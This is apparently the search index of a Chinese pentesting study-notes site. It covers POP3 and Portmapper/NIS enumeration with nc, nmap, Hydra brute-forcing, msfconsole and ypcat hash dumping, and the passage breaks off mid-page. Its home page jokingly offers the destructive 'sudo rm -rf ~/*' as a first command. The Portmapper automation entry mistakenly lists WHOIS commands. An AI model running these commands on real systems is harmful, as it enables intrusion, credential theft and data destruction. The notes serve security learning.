{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to No Safe \u5728\u8fd9\u91cc\u4f60\u4ec0\u4e48\u90fd\u5b66\u4e0d\u5230\uff01\uff01\uff01 \u5b66\u4e60\uff1f \u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01 \u9010\u6e10\u9000\u6b65\uff0c\u8d70\u4e0a\u6b63\u8f68\uff01 \ud83d\udcd6\u771f\u7684\u4e0d\u8fdb\ud83e\udde0 \u5b66\u4f1a\u4f60\u7684\u7b2c\u4e00\u6761\u547d\u4ee4 sudo rm -rf \uff5e/* # \u65b0\u7684\u672a\u6765\u5c31\u5728\u773c\u524d","title":"Home"},{"location":"#welcome-to-no-safe","text":"\u5728\u8fd9\u91cc\u4f60\u4ec0\u4e48\u90fd\u5b66\u4e0d\u5230\uff01\uff01\uff01","title":"Welcome to No Safe"},{"location":"#_1","text":"\u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01","title":"\u5b66\u4e60\uff1f"},{"location":"#_2","text":"\ud83d\udcd6\u771f\u7684\u4e0d\u8fdb\ud83e\udde0","title":"\u9010\u6e10\u9000\u6b65\uff0c\u8d70\u4e0a\u6b63\u8f68\uff01"},{"location":"#_3","text":"sudo rm -rf \uff5e/* # \u65b0\u7684\u672a\u6765\u5c31\u5728\u773c\u524d","title":"\u5b66\u4f1a\u4f60\u7684\u7b2c\u4e00\u6761\u547d\u4ee4"},{"location":"about/","text":"\u57df\u540d\u7531\u6765 \u53ea\u662f\u4e70\u57df\u540d\u7684\u65f6\u5019\u987a\u624b\u4e70\u4e86\uff0c\u5c31\u5f53\u4f5c\u4e00\u4e2a\u5b66\u4e60\u8bb0\u5f55\u7684\u5730\u65b9\u3002\u548cNoSafe\u5c0f\u7ec4\u6ca1\u6709\u5173\u7cfb\u3002 \u968f\u7f18\u66f4\u65b0 \u6b22\u8fce\u6295\u7a3f Wechat\uff1aFiveAndU","title":"About"},{"location":"about/#_1","text":"\u53ea\u662f\u4e70\u57df\u540d\u7684\u65f6\u5019\u987a\u624b\u4e70\u4e86\uff0c\u5c31\u5f53\u4f5c\u4e00\u4e2a\u5b66\u4e60\u8bb0\u5f55\u7684\u5730\u65b9\u3002\u548cNoSafe\u5c0f\u7ec4\u6ca1\u6709\u5173\u7cfb\u3002","title":"\u57df\u540d\u7531\u6765"},{"location":"about/#_2","text":"Wechat\uff1aFiveAndU","title":"\u968f\u7f18\u66f4\u65b0 \u6b22\u8fce\u6295\u7a3f"},{"location":"log/","text":"\u66f4\u65b0\u65e5\u5fd7 2023\u5e741\u6708\u66f4\u65b0\u5185\u5bb9 Network Prot \u5df2\u7ecf\u66f4\u65b0 \u251c\u2500\u2500 7-tcp-udp - ECHO\u6e17\u900f \u251c\u2500\u2500 21 - FTP\u6e17\u900f \u251c\u2500\u2500 22 - SSH-SFTP\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 23 - Telnet \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 25,465,587 - SMTPs\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 43 - WHOIS\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 49 - TACACS \u6e17\u900f \u251c\u2500\u2500 53 - DNS \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 69-udp-tftp\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 79 - Finger \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 88-tcp-udp-kerberos\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 110,995 - POP\u6e17\u900f\u6d4b\u8bd5 \u2514\u2500\u2500 111-TCP-UDP-Portmapper \u6e17\u900f\u6d4b\u8bd5","title":"Log"},{"location":"log/#_1","text":"","title":"\u66f4\u65b0\u65e5\u5fd7"},{"location":"log/#20231","text":"Network Prot \u5df2\u7ecf\u66f4\u65b0 \u251c\u2500\u2500 7-tcp-udp - ECHO\u6e17\u900f \u251c\u2500\u2500 21 - FTP\u6e17\u900f \u251c\u2500\u2500 22 - SSH-SFTP\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 23 - Telnet \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 25,465,587 - SMTPs\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 43 - WHOIS\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 49 - TACACS \u6e17\u900f \u251c\u2500\u2500 53 - DNS \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 69-udp-tftp\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 79 - Finger \u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 88-tcp-udp-kerberos\u6e17\u900f\u6d4b\u8bd5 \u251c\u2500\u2500 110,995 - POP\u6e17\u900f\u6d4b\u8bd5 \u2514\u2500\u2500 111-TCP-UDP-Portmapper \u6e17\u900f\u6d4b\u8bd5","title":"2023\u5e741\u6708\u66f4\u65b0\u5185\u5bb9"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f \u90ae\u5c40\u534f\u8bae ( POP ) \u662f\u4e00\u79cd\u8ba1\u7b97\u673a\u7f51\u7edc\u548c Internet \u6807\u51c6 \u534f\u8bae \uff0c\u5b83\u4ece\u8fdc\u7a0b\u90ae\u4ef6\u670d\u52a1\u5668\u63d0\u53d6\u548c\u68c0\u7d22\u7535\u5b50\u90ae\u4ef6\u4ee5\u4f9b\u4e3b\u673a\u8bbf\u95ee\u3002 POP \u662f OSI \u6a21\u578b\u4e2d\u7684\u5e94\u7528\u5c42 \u534f\u8bae \uff0c\u5b83\u4e3a\u6700\u7ec8\u7528\u6237\u63d0\u4f9b\u83b7\u53d6\u548c\u63a5\u6536\u7535\u5b50\u90ae\u4ef6\u7684\u80fd\u529b\uff08\u6765\u81ea \u6b64\u5904 \uff09\u3002 POP \u5ba2\u6237\u7aef\u901a\u5e38\u4f1a\u8fde\u63a5\u3001\u68c0\u7d22\u6240\u6709\u6d88\u606f\u3001\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7cfb\u7edf\u4e0a\u5e76\u4ece\u670d\u52a1\u5668\u4e0a\u5220\u9664\u5b83\u4eec\u3002POP \u6709 3 \u4e2a\u7248\u672c\uff0c\u4f46 POP3 \u662f\u4f7f\u7528\u6700\u591a\u7684\u4e00\u4e2a\u3002 \u9ed8\u8ba4\u7aef\u53e3: 110, 995(ssl) PORT STATE SERVICE 110/tcp open pop3 \u679a\u4e3e Banner \u6293\u53d6 nc -nv <IP> 110 openssl s_client -connect <IP>:995 -crlf -quiet \u624b\u52a8 \u53ef\u4ee5\u4f7f\u7528\u8be5\u547d\u4ee4 CAPA \u83b7\u53d6 POP3 \u670d\u52a1\u5668\u7684\u80fd\u529b\u3002 Automated nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port <PORT> <IP> #All are default scripts \u8be5 pop3-ntlm-info \u63d2\u4ef6\u5c06\u8fd4\u56de\u4e00\u4e9b\u201c \u654f\u611f \u201d\u6570\u636e\uff08Windows \u7248\u672c\uff09\u3002 POP3 \u66b4\u529b\u7834\u89e3 POP \u8bed\u6cd5 POP commands: USER uid Log in as \"uid\" PASS password Substitue \"password\" for your actual password STAT List number of messages, total mailbox size LIST List messages and sizes RETR n Show message n DELE n Mark message n for deletion RSET Undo any changes QUIT Logout (expunges messages if no RSET) TOP msg n Show first n lines of message number msg CAPA Get capabilities \u8bbf\u95ee \u8fd9\u91cc \u4f8b\u5b50: root@kali:~# telnet $ip 110 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready USER billydean +OK PASS password +OK Welcome billydean list +OK 2 1807 1 786 2 1021 retr 1 +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login for remote desktop ... try not to forget it this time! username: billydean password: PA$$W0RD!Z \u5371\u9669\u8bbe\u7f6e \u6765\u81ea https://academy.hackthebox.com/module/112/section/1073 \u73af\u5883 \u63cf\u8ff0 auth_debug \u542f\u7528\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55\u3002 auth_debug_passwords \u6b64\u8bbe\u7f6e\u8c03\u6574\u65e5\u5fd7\u8be6\u7ec6\u7a0b\u5ea6\u3001\u63d0\u4ea4\u7684\u5bc6\u7801\u548c\u8bb0\u5f55\u65b9\u6848\u3002 auth_verbose \u8bb0\u5f55\u4e0d\u6210\u529f\u7684\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\u53ca\u5176\u539f\u56e0\u3002 auth_verbose_passwords \u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u7684\u5bc6\u7801\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u4e5f\u53ef\u4ee5\u88ab\u622a\u65ad\u3002 auth_anonymous_username \u8fd9\u6307\u5b9a\u4f7f\u7528\u533f\u540d SASL \u673a\u5236\u767b\u5f55\u65f6\u8981\u4f7f\u7528\u7684\u7528\u6237\u540d\u3002 \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: POP Port_Number: 110 Protocol_Description: Post Office Protocol Entry_1: Name: Notes Description: Notes for POP Note: | Post Office Protocol (POP) \u662f\u4e00\u79cd\u7535\u8111\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u6807\u51c6\u534f\u8bae\uff0c\u5b83\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u90ae\u4ef6\u670d\u52a1\u5668\u63d0\u53d6\u5e76\u68c0\u7d22\u7535\u5b50\u90ae\u4ef6\uff0c\u4f9b\u4e3b\u673a\u8ba1\u7b97\u673a\u4f7f\u7528\u3002POP \u662f OSI \u6a21\u578b\u4e2d\u7684\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u4e3a\u6700\u7ec8\u7528\u6237\u63d0\u4f9b\u63d0\u53d6\u548c\u63a5\u6536\u7535\u5b50\u90ae\u4ef6\u7684\u80fd\u529b\u3002POP \u6709\u4e09\u4e2a\u7248\u672c\uff0c\u4f46 POP3 \u662f\u6700\u5e38\u7528\u7684\u7248\u672c\u3002 Entry_2: Name: Banner Grab Description: Banner Grab 110 Command: nc -nv {IP} 110 Entry_3: Name: Banner Grab 995 Description: Grab Banner Secure Command: openssl s_client -connect {IP}:995 -crlf -quiet Entry_4: Name: Nmap Description: Scan for POP info Command: nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -p 110 {IP} Entry_5: Name: Hydra Brute Force Description: Need User Command: hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V Entry_6: Name: consolesless mfs enumeration Description: POP3 enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit'","title":"110,995 - POP\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"\u90ae\u5c40\u534f\u8bae ( POP ) \u662f\u4e00\u79cd\u8ba1\u7b97\u673a\u7f51\u7edc\u548c Internet \u6807\u51c6 \u534f\u8bae \uff0c\u5b83\u4ece\u8fdc\u7a0b\u90ae\u4ef6\u670d\u52a1\u5668\u63d0\u53d6\u548c\u68c0\u7d22\u7535\u5b50\u90ae\u4ef6\u4ee5\u4f9b\u4e3b\u673a\u8bbf\u95ee\u3002 POP \u662f OSI \u6a21\u578b\u4e2d\u7684\u5e94\u7528\u5c42 \u534f\u8bae \uff0c\u5b83\u4e3a\u6700\u7ec8\u7528\u6237\u63d0\u4f9b\u83b7\u53d6\u548c\u63a5\u6536\u7535\u5b50\u90ae\u4ef6\u7684\u80fd\u529b\uff08\u6765\u81ea \u6b64\u5904 \uff09\u3002 POP \u5ba2\u6237\u7aef\u901a\u5e38\u4f1a\u8fde\u63a5\u3001\u68c0\u7d22\u6240\u6709\u6d88\u606f\u3001\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7cfb\u7edf\u4e0a\u5e76\u4ece\u670d\u52a1\u5668\u4e0a\u5220\u9664\u5b83\u4eec\u3002POP \u6709 3 \u4e2a\u7248\u672c\uff0c\u4f46 POP3 \u662f\u4f7f\u7528\u6700\u591a\u7684\u4e00\u4e2a\u3002 \u9ed8\u8ba4\u7aef\u53e3: 110, 995(ssl) PORT STATE SERVICE 110/tcp open pop3","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"nc -nv <IP> 110 openssl s_client -connect <IP>:995 -crlf -quiet","title":"Banner \u6293\u53d6"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"\u53ef\u4ee5\u4f7f\u7528\u8be5\u547d\u4ee4 CAPA \u83b7\u53d6 POP3 \u670d\u52a1\u5668\u7684\u80fd\u529b\u3002","title":"\u624b\u52a8"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#automated","text":"nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port <PORT> <IP> #All are default scripts \u8be5 pop3-ntlm-info \u63d2\u4ef6\u5c06\u8fd4\u56de\u4e00\u4e9b\u201c \u654f\u611f \u201d\u6570\u636e\uff08Windows \u7248\u672c\uff09\u3002","title":"Automated"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#pop3","text":"","title":"POP3 \u66b4\u529b\u7834\u89e3"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#pop","text":"POP commands: USER uid Log in as \"uid\" PASS password Substitue \"password\" for your actual password STAT List number of messages, total mailbox size LIST List messages and sizes RETR n Show message n DELE n Mark message n for deletion RSET Undo any changes QUIT Logout (expunges messages if no RSET) TOP msg n Show first n lines of message number msg CAPA Get capabilities \u8bbf\u95ee \u8fd9\u91cc \u4f8b\u5b50: root@kali:~# telnet $ip 110 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready USER billydean +OK PASS password +OK Welcome billydean list +OK 2 1807 1 786 2 1021 retr 1 +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login for remote desktop ... try not to forget it this time! username: billydean password: PA$$W0RD!Z","title":"POP \u8bed\u6cd5"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"\u6765\u81ea https://academy.hackthebox.com/module/112/section/1073 \u73af\u5883 \u63cf\u8ff0 auth_debug \u542f\u7528\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55\u3002 auth_debug_passwords \u6b64\u8bbe\u7f6e\u8c03\u6574\u65e5\u5fd7\u8be6\u7ec6\u7a0b\u5ea6\u3001\u63d0\u4ea4\u7684\u5bc6\u7801\u548c\u8bb0\u5f55\u65b9\u6848\u3002 auth_verbose \u8bb0\u5f55\u4e0d\u6210\u529f\u7684\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\u53ca\u5176\u539f\u56e0\u3002 auth_verbose_passwords \u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u7684\u5bc6\u7801\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u4e5f\u53ef\u4ee5\u88ab\u622a\u65ad\u3002 auth_anonymous_username \u8fd9\u6307\u5b9a\u4f7f\u7528\u533f\u540d SASL \u673a\u5236\u767b\u5f55\u65f6\u8981\u4f7f\u7528\u7684\u7528\u6237\u540d\u3002","title":"\u5371\u9669\u8bbe\u7f6e"},{"location":"Network%20Prot/110%2C995%20-%20POP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_5","text":"Protocol_Name: POP Port_Number: 110 Protocol_Description: Post Office Protocol Entry_1: Name: Notes Description: Notes for POP Note: | Post Office Protocol (POP) \u662f\u4e00\u79cd\u7535\u8111\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u6807\u51c6\u534f\u8bae\uff0c\u5b83\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u90ae\u4ef6\u670d\u52a1\u5668\u63d0\u53d6\u5e76\u68c0\u7d22\u7535\u5b50\u90ae\u4ef6\uff0c\u4f9b\u4e3b\u673a\u8ba1\u7b97\u673a\u4f7f\u7528\u3002POP \u662f OSI \u6a21\u578b\u4e2d\u7684\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u4e3a\u6700\u7ec8\u7528\u6237\u63d0\u4f9b\u63d0\u53d6\u548c\u63a5\u6536\u7535\u5b50\u90ae\u4ef6\u7684\u80fd\u529b\u3002POP \u6709\u4e09\u4e2a\u7248\u672c\uff0c\u4f46 POP3 \u662f\u6700\u5e38\u7528\u7684\u7248\u672c\u3002 Entry_2: Name: Banner Grab Description: Banner Grab 110 Command: nc -nv {IP} 110 Entry_3: Name: Banner Grab 995 Description: Grab Banner Secure Command: openssl s_client -connect {IP}:995 -crlf -quiet Entry_4: Name: Nmap Description: Scan for POP info Command: nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -p 110 {IP} Entry_5: Name: Hydra Brute Force Description: Need User Command: hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V Entry_6: Name: consolesless mfs enumeration Description: POP3 enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit'","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f \u63d0\u4f9b\u57fa\u4e8eUnix\u7684\u7cfb\u7edf\u4e4b\u95f4\u7684\u4fe1\u606f\u3002\u7aef\u53e3\u7ecf\u5e38\u88ab\u63a2\u6d4b\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bc6\u522bNix OS\uff0c\u5e76\u83b7\u53d6\u6709\u5173\u53ef\u7528\u670d\u52a1\u7684\u4fe1\u606f\u3002\u7528\u4e8eNFS\u3001NIS\u6216\u4efb\u4f55\u57fa\u4e8erpc\u7684\u670d\u52a1\u7684\u7aef\u53e3\u3002 \u9ed8\u8ba4\u7aef\u53e3: 111/TCP/UDP, Oracle Solaris \u4e2d\u4e3a 32771 PORT STATE SERVICE 111/tcp open rpcbind \u679a\u4e3e rpcinfo irked.htb nmap -sSUC -p111 192.168.10.1 \u6709\u65f6\u5b83\u4e0d\u4f1a\u7ed9\u4f60\u4efb\u4f55\u4fe1\u606f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f60\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u4fe1\u606f\uff1a Shodan port:111 portmap RPCBind + NFS \u5982\u679c\u60a8\u627e\u5230 NFS \u670d\u52a1\uff0c\u90a3\u4e48\u60a8\u53ef\u80fd\u80fd\u591f\u8fdb\u884c\u5217\u51fa\u548c\u4e0b\u8f7d\uff08\u5e76\u53ef\u80fd\u4e0a\u4f20\uff09\u6587\u4ef6\uff1a NIS \u5982\u679c\u60a8\u53d1\u73b0\u670d\u52a1 ypbind \u6b63\u5728\u8fd0\u884c\uff1a \u60a8\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5b83\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u9996\u5148\u60a8 \u9700\u8981\u731c\u6d4b\u673a\u5668\u7684 NIS\u201c\u57df\u540d\u201d \uff08\u5f53\u5b89\u88c5 NIS \u65f6\u5b83\u914d\u7f6e\u4e86\u4e00\u4e2a\u201c\u57df\u540d\u201d\uff09\uff0c \u5982\u679c\u4e0d\u77e5\u9053\u8fd9\u4e2a\u57df\u540d\u60a8\u5c06\u65e0\u80fd\u4e3a\u529b \u3002 \u83b7\u53d6\u73af\u5883\u7684 NIS \u57df\u540d\uff08\u672c\u4f8b\u4e2d\u4e3a example.org\uff09\u540e\uff0c\u4f7f\u7528 ypwhich \u547d\u4ee4 ping NIS \u670d\u52a1\u5668\u548c ypcat \u4ee5\u83b7\u53d6\u654f\u611f\u6750\u6599\u3002\u60a8\u5e94\u8be5\u5c06\u52a0\u5bc6\u7684\u5bc6\u7801\u54c8\u5e0c\u8f93\u5165 John the Ripper\uff0c\u4e00\u65e6\u7834\u89e3\uff0c\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u7cfb\u7edf\u8bbf\u95ee\u548c\u7279\u6743\u3002 root@kali:~# apt-get install nis root@kali:~# ypwhich -d example.org 192.168.10.1 potatohead.example.org root@kali:~# ypcat \u2013d example.org \u2013h 192.168.10.1 passwd.byname tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash \u4e3b\u6587\u4ef6 Map(s) \u7b14\u8bb0 /etc/hosts hosts.byname, hosts.byaddr \u5305\u542b\u4e3b\u673a\u540d\u548c IP \u8be6\u7ec6\u4fe1\u606f /etc/passwd passwd.byname, passwd.byuid NIS \u7528\u6237\u5bc6\u7801\u6587\u4ef6 /etc/group group.byname, group.bygid NIS\u7ec4\u6587\u4ef6 /usr/lib/aliases mail.aliases \u8be6\u7ec6\u90ae\u4ef6\u522b\u540d RPC Users \u5982\u679c\u60a8\u53d1\u73b0\u8fd9\u6837\u5217\u51fa\u7684 rusersd \u670d\u52a1\uff1a \u60a8\u53ef\u4ee5\u679a\u4e3e\u76d2\u5b50\u7684\u7528\u6237\u3002\u8981\u4e86\u89e3\u5982\u4f55\u9605\u8bfb[1026-\u6e17\u900f\u6d4b\u8bd5 Rsusersd]\u3002 Bypass \u8fc7\u6ee4\u7684 Portmapper \u7aef\u53e3 \u5982\u679c\u5728 nmap \u626b\u63cf\u671f\u95f4\u60a8\u770b\u5230 NFS \u7b49\u5f00\u653e\u7aef\u53e3\uff0c\u4f46\u7aef\u53e3 111 \u88ab\u8fc7\u6ee4\uff0c\u60a8\u5c06\u65e0\u6cd5\u5229\u7528\u8fd9\u4e9b\u7aef\u53e3\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u5728\u672c\u5730\u6a21\u62df\u4e00\u4e2a\u7aef\u53e3\u6620\u5c04\u5668\u670d\u52a1\uff0c\u5e76\u5c06 NFS \u7aef\u53e3\u4ece\u60a8\u7684\u673a\u5668\u4f20\u8f93\u5230\u53d7\u5bb3\u8005\u673a\u5668\uff0c\u60a8\u5c06\u80fd\u591f\u4f7f\u7528\u5e38\u89c4\u5de5\u5177\u6765\u5229\u7528\u8fd9\u4e9b\u670d\u52a1\u3002https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc \u4e2d\u7684\u66f4\u591a\u4fe1\u606f Shodan Portmap \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: Portmapper #Protocol Abbreviation if there is one. Port_Number: 43 #Comma separated if there is more than one. Protocol_Description: PM or RPCBind #Protocol Abbreviation Spelled out Entry_1: Name: Notes Description: Notes for PortMapper Note: | \u63d0\u4f9b\u57fa\u4e8eUnix\u7684\u7cfb\u7edf\u4e4b\u95f4\u7684\u4fe1\u606f\u3002\u7aef\u53e3\u7ecf\u5e38\u88ab\u63a2\u6d4b\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bc6\u522bNix OS\uff0c\u5e76\u83b7\u53d6\u6709\u5173\u53ef\u7528\u670d\u52a1\u7684\u4fe1\u606f\u3002\u7528\u4e8eNFS\u3001NIS\u6216\u4efb\u4f55\u57fa\u4e8erpc\u7684\u670d\u52a1\u7684\u7aef\u53e3\u3002 Entry_2: Name: rpc info Description: May give netstat-type info Command: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43 Entry_3: Name: nmap Description: May give netstat-type info Command: nmap -sSUC -p 111 {IP}","title":"111 - TCP/UDP Portmapper \u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"\u63d0\u4f9b\u57fa\u4e8eUnix\u7684\u7cfb\u7edf\u4e4b\u95f4\u7684\u4fe1\u606f\u3002\u7aef\u53e3\u7ecf\u5e38\u88ab\u63a2\u6d4b\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bc6\u522bNix OS\uff0c\u5e76\u83b7\u53d6\u6709\u5173\u53ef\u7528\u670d\u52a1\u7684\u4fe1\u606f\u3002\u7528\u4e8eNFS\u3001NIS\u6216\u4efb\u4f55\u57fa\u4e8erpc\u7684\u670d\u52a1\u7684\u7aef\u53e3\u3002 \u9ed8\u8ba4\u7aef\u53e3: 111/TCP/UDP, Oracle Solaris \u4e2d\u4e3a 32771 PORT STATE SERVICE 111/tcp open rpcbind","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"rpcinfo irked.htb nmap -sSUC -p111 192.168.10.1 \u6709\u65f6\u5b83\u4e0d\u4f1a\u7ed9\u4f60\u4efb\u4f55\u4fe1\u606f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f60\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u4fe1\u606f\uff1a","title":"\u679a\u4e3e"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"port:111 portmap","title":"Shodan"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#rpcbind-nfs","text":"\u5982\u679c\u60a8\u627e\u5230 NFS \u670d\u52a1\uff0c\u90a3\u4e48\u60a8\u53ef\u80fd\u80fd\u591f\u8fdb\u884c\u5217\u51fa\u548c\u4e0b\u8f7d\uff08\u5e76\u53ef\u80fd\u4e0a\u4f20\uff09\u6587\u4ef6\uff1a","title":"RPCBind + NFS"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#nis","text":"\u5982\u679c\u60a8\u53d1\u73b0\u670d\u52a1 ypbind \u6b63\u5728\u8fd0\u884c\uff1a \u60a8\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5b83\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u9996\u5148\u60a8 \u9700\u8981\u731c\u6d4b\u673a\u5668\u7684 NIS\u201c\u57df\u540d\u201d \uff08\u5f53\u5b89\u88c5 NIS \u65f6\u5b83\u914d\u7f6e\u4e86\u4e00\u4e2a\u201c\u57df\u540d\u201d\uff09\uff0c \u5982\u679c\u4e0d\u77e5\u9053\u8fd9\u4e2a\u57df\u540d\u60a8\u5c06\u65e0\u80fd\u4e3a\u529b \u3002 \u83b7\u53d6\u73af\u5883\u7684 NIS \u57df\u540d\uff08\u672c\u4f8b\u4e2d\u4e3a example.org\uff09\u540e\uff0c\u4f7f\u7528 ypwhich \u547d\u4ee4 ping NIS \u670d\u52a1\u5668\u548c ypcat \u4ee5\u83b7\u53d6\u654f\u611f\u6750\u6599\u3002\u60a8\u5e94\u8be5\u5c06\u52a0\u5bc6\u7684\u5bc6\u7801\u54c8\u5e0c\u8f93\u5165 John the Ripper\uff0c\u4e00\u65e6\u7834\u89e3\uff0c\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u7cfb\u7edf\u8bbf\u95ee\u548c\u7279\u6743\u3002 root@kali:~# apt-get install nis root@kali:~# ypwhich -d example.org 192.168.10.1 potatohead.example.org root@kali:~# ypcat \u2013d example.org \u2013h 192.168.10.1 passwd.byname tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash \u4e3b\u6587\u4ef6 Map(s) \u7b14\u8bb0 /etc/hosts hosts.byname, hosts.byaddr \u5305\u542b\u4e3b\u673a\u540d\u548c IP 